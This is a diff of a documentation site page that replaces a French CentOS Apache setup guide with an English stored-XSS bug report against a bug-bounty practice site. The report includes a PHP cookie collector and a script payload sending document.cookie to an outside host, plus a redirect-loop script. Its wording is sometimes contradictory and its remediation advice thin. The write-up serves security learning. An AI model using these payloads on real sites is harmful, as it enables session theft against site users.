@@ -9,7 +9,7 @@
   
   
   <link rel="shortcut icon" href="../../img/favicon.ico">
-  <title>Installation d'un serveur Aapche HTTPD - Worldskills - GJ enterprise</title>
+  <title>XSS stored - Worldskills - GJ enterprise</title>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />
 
   <link rel="stylesheet" href="../../css/theme.css" />
@@ -18,8 +18,8 @@
   
   <script>
     // Current page data
-    var mkdocs_page_name = "Installation d'un serveur Aapche HTTPD";
-    var mkdocs_page_input_path = "CentOs\\Installer_apache_httpd.md";
+    var mkdocs_page_name = "XSS stored";
+    var mkdocs_page_input_path = "yeswehack\\XSS stored.md";
     var mkdocs_page_url = null;
   </script>
   
@@ -56,24 +56,16 @@
                     </li>
                 </ul>
                 <p class="caption"><span class="caption-text">CentOs</span></p>
-                <ul class="current">
-                    <li class="toctree-l1"><a class="reference internal" href="../Changer%20le%20hostname/">Changer le hostname :</a>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../CentOs/Changer%20le%20hostname/">Changer le hostname :</a>
                     </li>
-                    <li class="toctree-l1 current"><a class="reference internal current" href="./">Installation d'un serveur Aapche HTTPD</a>
-    <ul class="current">
-    <li class="toctree-l2"><a class="reference internal" href="#installation">Installation</a>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#configuration">Configuration</a>
-    </li>
-    <li class="toctree-l2"><a class="reference internal" href="#commandes-administration">Commandes administration</a>
-    </li>
-    </ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../CentOs/Installer_apache_httpd/">Installation d'un serveur Aapche HTTPD</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../apache_TLS_SSL/">Apache / TLS / SSL</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../CentOs/apache_TLS_SSL/">Apache / TLS / SSL</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../management_utilisateur_%26_groupes/">Management utilisateur & groupes</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../CentOs/management_utilisateur_%26_groupes/">Management utilisateur & groupes</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../regle_parfeu/">Mise en place de règles firewall</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../../CentOs/regle_parfeu/">Mise en place de règles firewall</a>
                     </li>
                 </ul>
                 <p class="caption"><span class="caption-text">Cisco</span></p>
@@ -135,12 +127,14 @@
                     </li>
                 </ul>
                 <p class="caption"><span class="caption-text">Yeswehack</span></p>
-                <ul>
-                    <li class="toctree-l1"><a class="reference internal" href="../../yeswehack/SQL%20Injection/">SQL Injection</a>
+                <ul class="current">
+                    <li class="toctree-l1"><a class="reference internal" href="../SQL%20Injection/">SQL Injection</a>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../yeswehack/XSS%20stored/">XSS stored</a>
+                    <li class="toctree-l1 current"><a class="reference internal current" href="./">XSS stored</a>
+    <ul class="current">
+    </ul>
                     </li>
-                    <li class="toctree-l1"><a class="reference internal" href="../../yeswehack/neodemocorp/">YesWeHAck - NeoDemoCorp reports</a>
+                    <li class="toctree-l1"><a class="reference internal" href="../neodemocorp/">YesWeHAck - NeoDemoCorp reports</a>
                     </li>
                 </ul>
       </div>
@@ -164,11 +158,11 @@
     
       
         
-          <li>CentOs &raquo;</li>
+          <li>Yeswehack &raquo;</li>
         
       
     
-    <li>Installation d'un serveur Aapche HTTPD</li>
+    <li>XSS stored</li>
     <li class="wy-breadcrumbs-aside">
       
     </li>
@@ -179,117 +173,65 @@
           <div role="main">
             <div class="section">
               
-                <h1 id="installation-dun-serveur-aapche-httpd">Installation d'un serveur Aapche HTTPD</h1>
-<h2 id="installation">Installation</h2>
-<ul>
-<li>Mettre à jour les paquets</li>
-</ul>
-<pre><code>sudo yum update
+                <h2 id="1-description">1 Description :</h2>
+<p>I found a vulnerability in the comment part of articles on <strong>bountystarter</strong> website.
+This vulnerability is <strong>XSS stored</strong>.</p>
+<hr />
+<h2 id="2-exploitation">2 Exploitation :</h2>
+<p>I have read the source code of the web application and I see in the comment part user comments are inside <p> tag.
+For example :</p>
+<pre><code class="html">&lt;p&gt;
+   My wonderful comment
+&lt;/p&gt;
 </code></pre>
 
-<ul>
-<li>Installer la paquet httpd</li>
-</ul>
-<pre><code>sudo yum install httpd
+<p>But if I close this tag and inject Javascript instructions can I steal cookies ?</p>
+<hr />
+<h2 id="3-poc">3 PoC :</h2>
+<h3 id="31-prepare">3.1 Prepare :</h3>
+<p>I have created a PHP script on my web server <em>guillaume-petit.fr</em>.
+The script <em>cookies.php</em> save all cookie <em>get parameters</em> in <em>cookies.txt</em> file :</p>
+<pre><code class="php">&lt;?php
+    $fp = fopen('cookies.txt', 'w');        // open cookies.txt file
+    fwrite($fp, $_GET[&quot;cookie&quot;]);           // write cookie get parameter in cookies.txt
+    fclose($fp);                            // close cookies.txt file
+?&gt;
 </code></pre>
 
-<ul>
-<li>Lancer Apache</li>
-</ul>
-<pre><code>sudo systemctl start httpd
+<hr />
+<h3 id="32-exploit">3.2 Exploit :</h3>
+<p>In comment part in the article of the website :
+<a href="https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/view/Win%20tickets%20for%20Esport%20main%20event">https://bountystarter.com</a></p>
+<p>After, I inject in part comment my JavaScript instructions :</p>
+<pre><code class="html">&lt;/p&gt;
+&lt;script&gt;
+    window.open(&quot;http://guillaume-petit.fr/cookies.php?cookie=&quot;+document.cookie)
+&lt;/script&gt;
 </code></pre>
 
-<ul>
-<li>Lancer apache au démarrage</li>
-</ul>
-<pre><code>sudo systemctl enable httpd
+<p>I reload the page and test if my cookie is saved into my server.
+No, none cookie saves inside <em>cookies.txt</em> file, because cookies are created on the computer with <strong>http only</strong> flag.
+So anyone can steal cookies with this tip.</p>
+<hr />
+<h2 id="4-conclusion">4 Conclusion :</h2>
+<p>To conclude I have found a bug XSS injection stored, but I can't exploit this one because cookies are created with http only flag.</p>
+<hr />
+<h2 id="5-bonus-the-hell-loop">5 Bonus the hell loop :</h2>
+<p>Ok my injection doesn't work but, I can create a hell loop inside the application.</p>
+<p>To creating this loop I need to modify the php script in my web server :</p>
+<pre><code class="php">&lt;?php
+    header(&quot;Location: https://7e44cf96dade47a5c02259f1876a1c64.bountystarter.com/articles/view/Win%20tickets%20for%20Esport%20main%20event&quot;, true, 301);
+?&gt;
 </code></pre>
 
-<ul>
-<li>Checker le status</li>
-</ul>
-<pre><code>sudo systemctl status httpd
-</code></pre>
-
-<p><img alt="" src="../../images/installer_apache_httpd/status.png" /></p>
-<ul>
-<li>Ajouter les règles dans la parfeu</li>
-</ul>
-<p>Par defaut CentOS empeche le traffic entrant vers 80 et 443</p>
-<pre><code>sudo firewall-cmd ––permanent ––add-port=80/tcp
-</code></pre>
-
-<pre><code>sudo firewall-cmd ––permanent ––add-port=443/tcp
-</code></pre>
-
-<p><img alt="" src="../../images/installer_apache_httpd/firewall.png" /></p>
-<ul>
-<li>Recharger le par feu pour appliquer les changements</li>
-</ul>
-<pre><code>sudo firewall-cmd ––reload
-</code></pre>
-
-<ul>
-<li>Done ! </li>
-</ul>
-<p><img alt="" src="../../images/installer_apache_httpd/site_test.png" /></p>
-<h2 id="configuration">Configuration</h2>
-<ul>
-<li>
-<p>Les fichiers de configuration sont situé : <strong>/etc/httpd</strong></p>
-</li>
-<li>
-<p>Le fichier de config principal est situé : <strong>/etc/httpd/conf/httpd.conf</strong></p>
-</li>
-<li>
-<p>Les autres fichiers de configurations doivent : </p>
-</li>
-<li>se terminés par <strong>.conf</strong></li>
-<li>s'inclure dans le fichier de conf principal</li>
-<li>
-<p>se situer : <strong>/etc/httpd/conf.d/</strong></p>
-</li>
-<li>
-<p>Il est possible d'ajouter des fonctionnalités à apache via des modules :</p>
-</li>
-<li>
-<p>Chemin : <strong>/etc/httpd/conf.modules.d/</strong></p>
-</li>
-<li>
-<p>Logs</p>
-</li>
-<li>chemin : <strong>/var/log/httpd/</strong></li>
-</ul>
-<h2 id="commandes-administration">Commandes administration</h2>
-<ul>
-<li>Stopper le service apache</li>
-</ul>
-<pre><code>sudo systemctl stop httpd
-</code></pre>
-
-<ul>
-<li>Démarrer le service apache</li>
-</ul>
-<pre><code>sudo systemctl start httpd
-</code></pre>
-
-<ul>
-<li>Redémarrer le service apache</li>
-</ul>
-<pre><code>sudo systemctl restart httpd
-</code></pre>
-
-<ul>
-<li>Lancer apache au démarrage</li>
-</ul>
-<pre><code>sudo systemctl enable httpd
-</code></pre>
-
-<ul>
-<li>Retirer apache au démarrage</li>
-</ul>
-<pre><code>sudo systemctl disable httpd
-</code></pre>
+<p>Representation of attack :
+<img alt="img" src="../infinite-loop.png" /></p>
+<hr />
+<h2 id="6-risk">6 Risk :</h2>
+<p>No risk as long as cookies are set with the http only flag.</p>
+<hr />
+<h2 id="7-remediation">7 Remediation :</h2>
+<p>Use strip_tags() fonction for filter user input and escape html tags.</p>
               
             </div>
           </div>
@@ -297,10 +239,10 @@
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../apache_TLS_SSL/" class="btn btn-neutral float-right" title="Apache / TLS / SSL">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../neodemocorp/" class="btn btn-neutral float-right" title="YesWeHAck - NeoDemoCorp reports">Next <span class="icon icon-circle-arrow-right"></span></a>
       
       
-        <a href="../Changer%20le%20hostname/" class="btn btn-neutral" title="Changer le hostname :"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../SQL%20Injection/" class="btn btn-neutral" title="SQL Injection"><span class="icon icon-circle-arrow-left"></span> Previous</a>
       
     </div>
   
@@ -326,10 +268,10 @@
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../Changer%20le%20hostname/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../SQL%20Injection/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../apache_TLS_SSL/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../neodemocorp/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
